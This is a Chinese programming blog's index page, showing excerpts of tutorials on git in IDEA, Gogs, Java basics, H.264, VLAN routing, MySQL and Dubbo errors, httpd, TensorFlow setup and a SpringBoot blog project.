当你的项目已经被git托管了，那你新创建文件的时候，就会有消息窗弹出来，问你是否把刚刚新建的文件加入到暂缓区，你点击确定，就行，会自动帮你把刚刚创建的文件加入暂缓区；
如果弹窗信息你不小心点错了，点到了取消，那么就要手动的把刚刚创建的文件加入到暂缓区；
选中要添加暂缓区的文件，单击鼠标右键，选择 git 然后再选择 add ,点击add就行；
②将暂缓区的文件提交到仓库； 选中要commit的文件，单击鼠标右键，选择 git -&gt; commit file -&gt;选择要commit的文件；然后commit
③书写commit message ，相当于版本说明信息；
注意：在使用idea来操作git的时候，commit可以直接使用，因为你commit的时候，idea会主动帮你执行add这个命令；
④查看日志
或者是：
idea操作远程仓库 查看远程仓库 点击manage romotes 就可以查看单前项目关联的远程仓库；
添加远程仓库 一个本地仓库可以对应多个远程仓库；点击 + 号就可以添加远程仓库；
移除关联的远程仓库，点击 - 号，只是把与远程仓库的关联给解除了，并不会删除远程仓库；
推送至远程仓库 你要先克隆远程仓库里面的代码，和远程仓库建立了连接，才可以把自己的代码直接推送至远程仓库；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ef54009cf6683550bf462522f4201cc5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30e3d5d0e5be784b9401227ebd500ce0/" rel="bookmark">
			windows安装gogs实操指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.首先下载gogs二进制压缩包，当然下载源码安装的自行搜索操作。
地址：From binary - Gogs
我们这里下载最新的二进制压缩包
下载完成后，在D盘新建个GitServer的目录（可自定义目录），解压zip包
里面有个gogs.exe的可执行文件，在cmd下面执行gogs web
gogs默认是监听3000端口，然后我们通过web管理页面进行初始化安装
浏览器输入地址：http://localhost:3000/install
可以按照要求填写相关的配置：
然后点击 立即安装 就可以了，然后就是注册自己的账户然后登陆
然后就可以用git clone 了，相关的地址可以在管理页面的仓库处看到
如果要迁移外部仓库也可以如下：
目前就先写这么多吧 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/51062481901d07708cee8685b8dd7079/" rel="bookmark">
			匿名内部类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目 录 匿名内部类是局部内部类的一种简化形式.本质上是一个对象,是实现了该接口或继承了该抽象类的子类对象.
语法格式： new 类名或者接口名(){ 重写方法; } ;
给匿名内部类名命: 虽然这是匿名内部类,但是仍然可以利用多态来给匿名内部类名命的哈!
匿名内部类的好处: 匿名内部类，经常作为参数，或返回值，使用比较方便。
一个类中可以嵌套一个接口:
匿名内部类是局部内部类的一种简化形式.本质上是一个对象,是实现了该接口或继承了该抽象类的子类对象. 语法格式：
new 类名或者接口名(){
重写方法;
} ; public class MyTest { public static void main(String[] args) { new Father() { //new了一个父类抽象类的子类对象.匿名的 @Override //重写了父类中的抽象方法 public void hehe() { System.out.println("呵呵呵呵呵呵"); } }; //创建了父类的子类对象并且调用重写后的方法 new Father() { @Override public void hehe() { System.out.println("44444444444444"); } }.hehe(); } } abstract class Father { public abstract void hehe(); } 给匿名内部类名命: 虽然这是匿名内部类,但是仍然可以利用多态来给匿名内部类名命的哈! public class MyTest { public static void main(String[] args) { //匿名内部类 new AA() { @Override public void aa() { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/51062481901d07708cee8685b8dd7079/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/402316d8a11ffb6e8e7e34a634ed923b/" rel="bookmark">
			H264编解码实战
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、H264中的profile和level H264 Profile：对视频压缩特性的描述，Profile越高，就说明采用了越高级的压缩特性；H264 Level：Level是对视频的描述，Level越高，视频的码率、分辨率、fps越高。
二、H264 SPS中的重要参数 分辨率：
帧相关：
log2_max_frame_num_minus4：用于计算MaxFrameNum的值。计算公式为MaxFrameNum = 2^(log2_max_frame_num_minus4 + 4)。MaxFrameNum是frame_num的上限值，frame_num是图像序号的一种表示方法，在帧间编码中常用作一种参考帧标记的手段。值得注意的是 frame_num 是循环计数的，即当它到达 MaxFrameNum 后又从 0 重新开始新一轮的计数。 解码器必须要有机制检测这种循环， 不然会引起类似千年虫的问题，在图像的顺序上造成混乱。pic_order_cnt_type：指明了 poc (picture order count) 的编码方法， poc 标识图像的播放顺序。由于H.264 使用了 B 帧预测，使得图像的解码顺序并不一定等于播放顺序，但它们之间存在一定的映射关系。 poc 可以由 frame-num 通过映射关系计算得来，也可以索性由编码器显式地传送。 H.264 中一共定义了三种 poc 的编码方法，这个句法元素就是用来通知解码器该用哪种方法来计算 poc。max_num_ref_frames：指定参考帧队列可能达到的最大长度，解码器依照这个句法元素的值开辟存储区，这个存储区用于存放已解码的参考帧， H.264 规定最多可用 16 个参考帧，本句法元素的值最大为 16。值得注意的是这个长度以帧为单位，如果在场模式下，应该相应地扩展一倍。 帧率的计算：
framerate = (float)(sps-&gt;vui.vui_time_scale) / (float)(sps-&gt;vui.vui_num_units_in_tick) / 2; 三、H264 PPS与Slice-Header PPS：
Slice Header：
帧类型GOP中解码帧序号预测权重滤波 四、H264分析工具 Electra Stream Eye（付费）CodecVisa（付费）雷神开发的工具（免费） elecard下载地址：
https://www.elecard.com/products/video-analysis
雷神：
https://sourceforge.net/projects/videoeye/files
工具详细的使用说明可以参考雷神写的博客：
https://blog.csdn.net/leixiaohua1020/article/details/34553607
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/402316d8a11ffb6e8e7e34a634ed923b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de147515b0197ef54c7e931c1d7f8d99/" rel="bookmark">
			vsocde空格太小解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vscode 默认空格间距很小，导致代码看起来不美观，实际是字体的问题。换个字体就好了，点击vscode左下角的设置，将图中的字体栏内容改为下图中所示，重启vscode即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d3c94368f26f12ce3a875fd597a5279a/" rel="bookmark">
			高德地图搜索、拖拽 查询地址
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		demo-效果图 代码–（引用的地图，key值换成你自己的） &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;地图搜索与拖拽选址&lt;/title&gt; &lt;style&gt; #mapContainer{ position: relative; width: calc(100vw-20px); height: calc(100vh - 30px); background: #fff; z-index: 1; overflow: hidden; } .searchBox{ position: absolute; left: 20px; top: 20px; z-index: 2; } .searchBox #keyword{ height: 30px; line-height: 30px; width: 260px; padding: 0 5px; } .searchResult{ position: absolute; bottom: 50px; left: 30px; z-index: 2; height: 100px; width: 400px; background: #fff; border-radius: 8px; padding: 20px; cursor: default; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d3c94368f26f12ce3a875fd597a5279a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35135aeb2cb578aa4ae9eea200f9226e/" rel="bookmark">
			面向对象（四）定义构造方法 构造方法的重载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		定义构造方法 构造方法是一个特殊的成员方法，在定义时，有以下几点需要注意： （1）构造方法的名称必须与类名一致。
（2）构造方法名称前不能有任何返回值类型的声明。
（3）不能在构造方法中使用return返回一个值，但是可以单独写return语句作为方法的结束。
案例 演示无参构造方法的定义 public class Student { public Student() { System.out.println("调用了无参构造方法"); } } public class Example05 { public static void main(String[] args) { System.out.println("声明对象"); Student stu=null; System.out.println("实例化对象"); stu=new Student(); } } 程序运行结果
演示有参构造方法的定义与调用。 构建有参构造方法（确定参数之后-鼠标右击空白处，generate-construction-ctrl选择所有参数-ok）
public class Student { private String name; private int age; public Student(String name, int age) { this.name = name; this.age = age; } public void read(){ System.out.println("我是："+name+"年龄"+age); } } public class Example06 { public static void main(String[] args) { Student stu =new Student("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/35135aeb2cb578aa4ae9eea200f9226e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8cd54365b2b643033c846e3e8ff7658/" rel="bookmark">
			查看spark版本和scala版本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1、打开命令行
2、输入
java -version 先检查一下java
3、输入
spark-shell 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c8f35d11d2fc4fc3acbda90a2a52447e/" rel="bookmark">
			华为不同vlan直接通信
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		不同vlan之间通信3种办法 1， 不同vlan各拿出一个接口连接路由器，可以实现不同vlan相互通信，但是太浪费不太现实。
**2，**单臂路由 将交换机和路由器之间的链路配置为trunk链路，并且在路由器g0/0/0创建子接口（有多少个vlan就配置多少个子接口），交换机g0/0/1配置需要通过的vlan。
pc配置静态ip，掩码，网关（子接口的ip）。
交换机配置
vlan batch 2 3
int g 0/0/1
port link-type trunk
port trunk allow-pass vlan 2 3
q
int e 0/0/1
port link-type access
port default vlan 2
q
int e 0/0/2
port link-type access
port default vlan 3
路由器配置
int g 0/0/0.1
dot1q termination vid 2
ip address 192.168.1.254 24
arp broadcast enable
q
int g 0/0/0.2
dot1q termination vid 3
ip address 192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c8f35d11d2fc4fc3acbda90a2a52447e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c8c4913d4944811d92b46e908ee167f/" rel="bookmark">
			Java中的方法定义与调用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.方法：
将具有独立功能的代码块组织成为一个整体，使其成为具有特殊功能的代码集。
2.方法必须先创建才可以使用，该过程称为方法定义。
方法必须先定义后调用，否则程序会报错。
3.方法创建后并不是直接运行的，需要手动使用后才可执行，该过程称为方法调用。
4.方法定义
1）不带参数的方法定义格式：
public static void 方法名(){ //方法体，根据实际需求编写的代码块 } 2）带参数的方法定义格式：
public static void 方法名(参数1,参数2,....){//参数的一般格式：数据类型 变量名 //方法体 } 方法定义时，参数中的 数据类型 和变量名 都不可以省略，缺少其中任意一个，程序将报错。多个参数之间用逗号进行分割。
5.方法调用
1）不带参数的方法调用格式：
方法名(); 2）带参数的方法调用格式：
方法名(参数);//参数为变量名或常量值，多个参数之间用逗号分割 方法调用要在main()方法中调用，因为这是程序的入口。
当方法调用出现以后，会进入到相应的方法中，程序从上到下开始执行。
方法调用时的参数的数量与类型，必须与方法 定义中的设置相匹配，否则程序报错。
6.形参：方法定义中的参数，等同于变量定义的格式：数据类型 变量名;。
7.实参：方法调用中的参数，等同于直接使用变量或常量。
8.练习：输入一个数，判断它是否为偶数
import java.util.Scanner; public class Demo { public static void main(String[] args) { Scanner sc = new Scanner(System.in); int x = sc.nextInt(); isEvenNumber(x); } public static void isEvenNumber(int x){ if (x%2==0) System.out.println(x+"是偶数"); else System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c8c4913d4944811d92b46e908ee167f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68e057812b42f7ac3cb393cb2863d1fb/" rel="bookmark">
			node.js连接mysql出现错误： ER_NOT_SUPPORTED_AUTH_MODE: Client does not support authentication protocol requ
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		node.js连接mysql出现错误： ER_NOT_SUPPORTED_AUTH_MODE: Client does not support authentication protocol requested by server; consider upgrading MySQL client 目前是因为版本问题
解决办法：
1、找到MYSQL的安装路径下的bin目录，这里是：C:\Program Files\MySQL\MySQL Server 8.0\bin，然后在命令行工具进入，如下图
2、登录mysql数据库。即继续在命令行工具输入：mysql -u root -p。然后输入自己数据库的密码，进入数据库
3、接着输入 ：
ALTER USER ‘root’@‘localhost’ IDENTIFIED WITH mysql_native_password BY ‘123456’;
上边我输入的密码是：123456，可以改成自己的密码。
4、最后在输入下面这个命令，然后回车。
FLUSH PRIVILEGES;
5:第三步第四步的截图：
然后就可以连上数据库了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8408f0d5a72b271d4ee200222861722/" rel="bookmark">
			Caused by: org.apache.dubbo.remoting.RemotingException: message can not send, because channel is
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题描述 我们用的是nacos注册中心,在本地启动服务的时候一直报服务连接超时,这个问题困扰了我好多天,反正不影响开发也就没太管。
Caused by: org.apache.dubbo.remoting.RemotingException: message can not send, because channel is closed . url:dubbo://10.0.112.160:27013/com.alibaba.cloud.dubbo.service.DubboMetadataService?anyhost=true&amp;application=eq&amp;bind.ip=10.0.112.160&amp;bind.port=27013&amp;check=false&amp;codec=dubbo&amp;deprecated=false&amp;dubbo=2.0.2&amp;dynamic=true&amp;generic=true&amp;group=dashboard&amp;heartbeat=60000&amp;interface=com.alibaba.cloud.dubbo.service.DubboMetadataService&amp;methods=getAllServiceKeys,getServiceRestMetadata,getExportedURLs,getAllExportedURLs&amp;pid=9982&amp;qos.enable=false&amp;register.ip=10.0.41.16&amp;release=2.7.8&amp;remote.application=dashboard&amp;revision=2.2.5.RELEASE&amp;side=consumer&amp;sticky=false&amp;timestamp=1647507950228&amp;version=1.0.0 at org.apache.dubbo.remoting.transport.AbstractClient.send(AbstractClient.java:176) at org.apache.dubbo.remoting.transport.AbstractPeer.send(AbstractPeer.java:53) at org.apache.dubbo.remoting.exchange.support.header.HeaderExchangeChannel.request(HeaderExchangeChannel.java:135) at org.apache.dubbo.remoting.exchange.support.header.HeaderExchangeClient.request(HeaderExchangeClient.java:95) at org.apache.dubbo.rpc.protocol.dubbo.ReferenceCountExchangeClient.request(ReferenceCountExchangeClient.java:91) at org.apache.dubbo.rpc.protocol.dubbo.DubboInvoker.doInvoke(DubboInvoker.java:105) at org.apache.dubbo.rpc.protocol.AbstractInvoker.invoke(AbstractInvoker.java:163) at org.apache.dubbo.rpc.protocol.AsyncToSyncInvoker.invoke(AsyncToSyncInvoker.java:52) at org.apache.dubbo.rpc.listener.ListenerInvokerWrapper.invoke(ListenerInvokerWrapper.java:78) at org.apache.dubbo.rpc.filter.GenericImplFilter.invoke(GenericImplFilter.java:125) at org.apache.dubbo.rpc.protocol.ProtocolFilterWrapper$1.invoke(ProtocolFilterWrapper.java:83) at org.apache.dubbo.monitor.support.MonitorFilter.invoke(MonitorFilter.java:89) at org.apache.dubbo.rpc.protocol.ProtocolFilterWrapper$1.invoke(ProtocolFilterWrapper.java:83) at org.apache.dubbo.rpc.protocol.dubbo.filter.FutureFilter.invoke(FutureFilter.java:51) at org.apache.dubbo.rpc.protocol.ProtocolFilterWrapper$1.invoke(ProtocolFilterWrapper.java:83) at cn.com.smart.log.trace.DubboTraceFilter.invoke(DubboTraceFilter.java:34) at org.apache.dubbo.rpc.protocol.ProtocolFilterWrapper$1.invoke(ProtocolFilterWrapper.java:83) at org.apache.dubbo.rpc.filter.ConsumerContextFilter.invoke(ConsumerContextFilter.java:69) at org.apache.dubbo.rpc.protocol.ProtocolFilterWrapper$1.invoke(ProtocolFilterWrapper.java:83) at org.apache.dubbo.rpc.protocol.InvokerWrapper.invoke(InvokerWrapper.java:56) at org.apache.dubbo.rpc.cluster.support.FailoverClusterInvoker.doInvoke(FailoverClusterInvoker.java:82) ... 35 common frames omitted 原因分析： 我在日志中突然发现了这么一条记录:
[eq:10.0.41.16:7012] 2022-04-19 18:55:41.822 WARN 9982 [] [main] a.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8408f0d5a72b271d4ee200222861722/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0804282c711c05761a83c559dc0aa94/" rel="bookmark">
			51单片机（入门保姆级教程）——LED闪烁及流水灯
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、LED基本原理和知识
图1 LED共阳极原理图
1.1 LED共阴极和共阳极的含义 LED的最小单元是发光二极管。发光二极管是区分正负极的，正向导通，反向截止。共阴极就是发光二极管的负极连接在一起，共阳极就是发光二极管的正极连接在一起。
1.2 共阴极和共阳极的区别 耗能不一样。共阳极二极管的公共端接在高电平，需要高电平时时刻刻处在工作状态；而共阴极二极管公共端接低（GND），只需指定二极管工作时给某个二极管高电平即可，有效降低了功耗，对长时间工作LED来言有效降低了屏热。线路复杂程度不同。一般在实际工程中共阴极二极管比共阳极二极管的线路复杂，共阳极不需要那么多的高电平线路驱动。 二、单个LED的闪烁 2.1 KEIL文件的建立 具体的keil工程文件创建可以参考[1]中的过程。
2.2 LED的闪烁程序 #include &lt;reg52.h&gt;	//定义单片机的一些特殊功能寄存器 sbit led=P2^0;	//定义指定LED灯的管脚 void delay(unsigned int i)	//延时函数。unsigned int定义无符号整型，范围0-655535 { while(i--);	//i=1时，大约延时10us } void main() //主函数，程序从这里开始执行 { while(1) { led=0; //0表示低电平，共阳极二极管点亮 delay(50000); //大约延时450ms led=1; //1表示高电平，LED熄灭 delay(50000); //大约延时450ms	}	} 2.3 包含/区分/学习知识点 #include&lt;reg52.h&gt;和#include"reg52.h"区别 两者来说区别不大，&lt; &gt;的引用是C51库函数里面的文件，而" "是引用我们自己创建的库函数里面的文件。
while循环函数 while(i&lt;10) { i=i+1; } while函数的定义为：执行程序里面的函数文件，即i+1，执行完后判断i是否&lt;10，若小于，继续执行，若大于等于则跳出循环。
DELAY延时函数（掌握和学习） 在单片机中有两种延时方式，一种是软件延时，一种是硬件延时（计时器/计数器）。本知识点主要介绍软件延时函数。
void delay(unsigned int i) { while(i--);	} 延时函数，i=1时，大约延时10us
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f0804282c711c05761a83c559dc0aa94/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1191e67cf32c55c0a700e4551aff83bd/" rel="bookmark">
			软考中级了解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.全称：计算机技术与软件技术资格(水平)考试。
2.简称：软件资格考 ,软考。
3.组织单位：人力资源和社会保障部,工业和信息化部联合组织实施。
4.考试形式：全国统考，中高级考试都是笔试。
5.等级：国家级考试(27个)，分为，初，中，高三级。
6.考试时间：2次/年（5/11),中，高级考试分开。
7.考试费用：中级160元左右、高级200元左右。
8.软考的优势: 积分落户以及薪资加薪.
9.考试内容:
1.计算机与软件工程知识: AM 150分钟, 笔试 ,选择题.
75分/75个,满分75分,及格分数:45
2.软件设计: PM 150分钟 , 笔试, 问答题. 满分75分
必做题前四个15分/个,选做题后两个 15分/个,及格分数:45
10.报考条件:
1大专文凭以上，不能越级考.
2身份证，大专毕业证，工作证（介绍信）.
11.考试知识点.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8c78f4e67e43a46045cebb50fb23a293/" rel="bookmark">
			C语言-学生学号成绩读入程序（输出了学生总分、平均分、名次以及学生信息的查询）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		任务描述
成绩排名次
某班期末考试科目为数学（MT）、英语（EN)和物理（PH)，有最多不超过30人参加考试。考试后要求：
(1) 计算每个学生的总分和平均分；
(2) 按总分成绩由高到低排出成绩的名次；
(3) 输出名次表，表格内包括学生编号、各科分数、总分和平均分；
(4) 任意输入一个学号，能够查找出该学生在班级中的排名及其考试分数。
提示：用二维数组score存放每个学生各门课程的成绩，用一维数组num存放每个学生的学号，用一维数组sum存放每个学生的总分，用一维数组aver存放每个学生的平均分。
测试说明
测试数据：
20183001 98 99 97 20183002 89 85 90 20183003 77 67 88 20183004 88 82 95 20183005 56 76 80 20183006 66 65 74 20183007 99 99 91 20183008 56 63 60 20183009 45 56 63 20183010 90 88 87 输入学生信息的格式为：
按总分排名，按名次输出名次表，输出内容为：
任意输入一个学号，查找并输出该学生信息，输出内容为：
找不到时输出为：
注：找不到时格式字符串为：
1.Please enter searching number:20183006 2.position: NO | MT EN PH SUM AVER 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8c78f4e67e43a46045cebb50fb23a293/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f97155af41e6478ebcda044d81a1922/" rel="bookmark">
			httpd服务管理与配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		httpd服务管理与配置 前言：
我这里讲解httpd服务的安装以及配置和管理
提示：yum/apt安装和源码编译安装的目录结构大不相同，建议使用源码安装，方便管理
什么是httpd服务？ httpd服务，又称apache服务，是我们最常用的Web服务之一，它是一款功能强大、稳定性好的Web服务，该服务提供网站访问、发送网页、图片等文件内容的功能。 文章目录 httpd服务管理与配置 一、httpd安装源码安装yum/apt安装 二、httpd服务配置编译安装目录结构配置文件多站点配置基于域名的虚拟站点基于ip的虚拟站点基于端口的虚拟站点 三、httpd服务管理httpd日志管理1.自带的日志分割工具:rotatelogs2.三方工具：cronolog3.日志分析系统 访问控制与安全1.地址限制访问2.用户密码验证访问 httpd优化访问1.网页压缩模块2.网页缓存模块3.防盗链模块 一、httpd安装 apr和apr-util包下载地址：http://archive.apache.org/dist/apr/
httpd下载地址：https://httpd.apache.org/
源码安装 1.安装依赖工具和包
#更新epel源和安装编译工具 yum install -y epel-release yum clean all &amp;&amp; yum makecache yum -y install gcc gcc-g++ make #安装依赖包 yum -y install expat-devel pcre pcre-devel 2.编译安装apr和apr-util依赖包
#安装apr-1.7.0 tar zxf apr-1.7.0.tar.gz &amp;&amp; cd apr-1.7.0 ./configure --prefix=/usr/local/apr make &amp;&amp; make install #安装apr-util-1.6.1 tar zxf apr-util-1.6.1.tar.gz &amp;&amp; cd apr-util-1.6.1 ./configure --prefix=/usr/local/apr-util --with-apr=/usr/local/apr make &amp;&amp; make install 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f97155af41e6478ebcda044d81a1922/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fbf2c421d6c51b1762b1036583b5f0e5/" rel="bookmark">
			Tensorflow-gpu安装&#43;Keras安装&#43;Pytorch-gpu安装 经验分享/Win10 (conda安装Cuda和Cudnn) 含测试代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Tensorflow-gpu安装+Keras安装+Pytorch-gpu安装 经验分享/Win10 (conda安装Cuda和Cudnn) 含测试代码 注意： 本文中的Cuda和Cudnn安装均采用conda安装方法，无需单独下载安装Cuda、Cudnn等软件。
以下教程是建立在已经安装好Anaconda的基础上。
系统：Windows10
Anaconda：2020.07
python 3.8.0
cuda版本：cuda 11.0
cudnn版本：cudnn 8.1
Tensorflow版本：tensorflow-gpu 2.4.0
keras版本：keras-2.4.0
准备事项 Anaconda环境变量配置 1、在安装的时候勾选添加即可
2、自己配置：电脑-&gt;属性-&gt;高级系统设置-&gt;环境变量-&gt;系统变量，找到Path，加入三个文件夹的存储路径，如下图。
添加镜像源 这里添加的是阿里的源，free和main是必选，其它可选
conda config --add channels https://mirrors.aliyun.com/anaconda/pkgs/free conda config --add channels https://mirrors.aliyun.com/anaconda/pkgs/main conda config --add channels https://mirrors.aliyun.com/anaconda/pkgs/msys2 conda config --add channels https://mirrors.aliyun.com/anaconda/pkgs/r conda config --add channels https://mirrors.aliyun.com/anaconda/cloud/Paddle conda config --add channels https://mirrors.aliyun.com/anaconda/cloud/auto conda config --add channels https://mirrors.aliyun.com/anaconda/cloud/biobakery conda config --add channels https://mirrors.aliyun.com/anaconda/cloud/bioconda conda config --add channels https://mirrors.aliyun.com/anaconda/cloud/c4aarch64 conda config --add channels https://mirrors.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fbf2c421d6c51b1762b1036583b5f0e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0cde78763cdf3989fd67f3207275f88/" rel="bookmark">
			EGE基础：输入篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		EGE专栏：EGE专栏
EGE基础：输入篇 文章目录 一、sys_edit 类1. 头文件检查 二、 sys_edit类的使用1. 使用步骤1.1 输入框的创建1.2 设置输入框参数1.2.1 必要设置1.2.1.1 输入框位置1.2.1.2 输入框大小 1.2.2 非必要设置1.2.2.1 允许输入的最大字符数1.2.2.2 输入框背景颜色1.2.2.3 输入框文字的颜色1.2.2.4 输入框文字的字体1.2.2.5 只读模式 1.3 设置输入框可见1.4 设置输入框获取焦点 (非必要设置) 2. 输入框内容的获取2.1 注意事项2.2 宽字符 3. sys_edit类的其它操作3.1 设置输入框的内容3.2 清空输入框内容3.3 获取输入框位置和大小3.4 隐藏输入框3.5 销毁输入框 4. 输入框说明4.1 输入框相关的一些事项4.2 变量的生命周期问题 三、输入框使用例程1. 文本输入实例1.1 字符char型1.2 宽字符wchar_t 型 2. 多个输入框2.1 多个输入框的使用2.2 相同样式输入框统一初始化 3. getch()无法阻塞、窗口闪退的情况4. 获取数字等输入4.1 从输入框获取参数示例 5. EGE自带的输入对话框inputbox_getline() EGE中的输入是基于 &lt;ege/sys_edit.h&gt; 头文件中是 sys_edit 类的。这个类提供一个输入框，可以用来输入。
缺点是sys_edit 类中检测是否获得焦点的 isfocus() 失效，那创建多个输入框时，就不可以通过回车来获取输入内容，因为不知道焦点在哪个输入框。
如果能检测焦点，那输入后回车就可以判断焦点在哪个输入框，然后获取该输入框的内容。现在不能检测，那就只能 通过添加按钮 的方式，当点击某个按钮时，就获取对应的输入框的内容。
一、sys_edit 类 使用前需要先包含 sys_edit.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b0cde78763cdf3989fd67f3207275f88/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30c446c984e9093b2533ec77967c6cf0/" rel="bookmark">
			【做项目】基于SpringBoot从零开发的个人博客 —— 从技术选型到部署实战（附学习路线）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、前言1.1 背景介绍1.2 寻找开源项目1.3 技术选型 二、正式开发2.1 看懂项目并模仿2.2 正式动手敲之前，内化成自己的项目，对其设计并架构2.3 动手编写 三、博客功能展示3.1 Redis的集成3.2 留言的级联关系3.3 后台管理功能（已用Shiro进行了权限控制，只有管理员能进去）3.4 文件上传功能 四、问题的出现与解决4.1 MyBatis的多对多处理4.2 RESTful风格的再理解4.3 Shiro资源过滤 五、博客主营业务完成后，陆续添加的其他功能5.1 集成Shiro5.2 集成Redis5.3 集成Swagger5.4 集成PageHelper5.5 集成文件上传功能 六、购买服务器和域名，部署到阿里云，让大家访问6.1 前置知识：Linux相关6.2 购买服务器和域名，并完成部署 七、总结与反思 一、前言 先上博客链接：www.zr7.top
全套资料和源代码已上传至Gitee：https://gitee.com/da-ji/full_stack_developer，大家需要可自取
1.1 背景介绍 笔者是一名非科班出身，对编程非常感兴趣的一名在校学生。在今年11月初，我学完了SSM阶段。但是对知识的掌握仅仅停留在网络视频以及技术书籍上的了解，并没有任何实际的项目经验。所以就产生了做一个综合项目的想法。
1.2 寻找开源项目 在寻找这类综合项目时，我却迷茫了。首先是网上的开源项目眼花缭乱，不知道哪些项目适合我现在的阶段。
跟着普通大学计算机专业的实训走，做一个SSM架构的图书管理系统？跟着尚硅谷，黑马程序员这类培训机构走，做一个黑马旅游网？谷粒商城？去GitHub或是码云上看看，有没有优秀的开源项目可以借鉴？ 最终我通过各种渠道，找到了各种各样的优秀综合项目：
通过对上面思维导图的梳理，我的思路逐渐清晰——那就是做一个个人博客项目。
原因如下几点：
网络上开源项目多，可供学习资源多，也有相关技术讨论圈子——技术成熟可扩展性强，能够基于自己的技术栈不断往里面扩充 事后看来，这一条的确是非常明智的决定。该博客的技术栈最终经历了SSM，SpringBoot，Redis，Shiro等等，而这些技术并不是我本来就会的，而是我通过边建博客边学习逐步掌握的，掌握一个点，就向个人博客中想办法添加一个点。 可实际部署到远程服务器中，不仅锻炼全栈开发能力，还能获得一定的服务器运维知识。 这里我并不是说其他类型的综合项目不好，比如音乐播放系统，图书馆系统，网盘系统等等，它们也很优秀，但是最终将其发布到互联网，并连接到域名，由于种种原因，部署的实际意义并不是很大，但是它们的业务逻辑和涉及的知识点也很全面，适合自己练手做。
1.3 技术选型 前台显示借鉴：燕十三的前端模板（已于Gitee上开源）
后台管理借鉴：李仁密老师——SpringBoot开发一个小而美的个人博客（已于GitHub上开源，并有相关视频教学）
虽然借鉴了他们的开源代码学习，但是在编写的实践过程中，后台和前台并不是互通的（李仁密和燕十三根本就不认识），导致他们之间的接口不互通，对此我只能自己设计后端部分和接口。
